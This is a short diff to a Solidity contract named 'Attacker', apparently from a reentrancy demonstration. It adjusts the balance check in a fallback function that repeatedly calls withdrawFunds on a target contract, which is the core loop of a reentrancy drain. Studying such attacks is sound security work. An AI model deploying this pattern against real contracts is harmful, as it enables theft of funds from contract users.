@@ -15,7 +15,7 @@ contract Attacker {
     uint256 public  withdraw = 1  ; 
     bool private withdrawing = false;
     fallback() external payable {
-        if(address(malicious).balance > 1 ether)
+        if(address(malicious).balance >= 1 ether)
         {
             malicious.withdrawFunds(1 ether);
         }
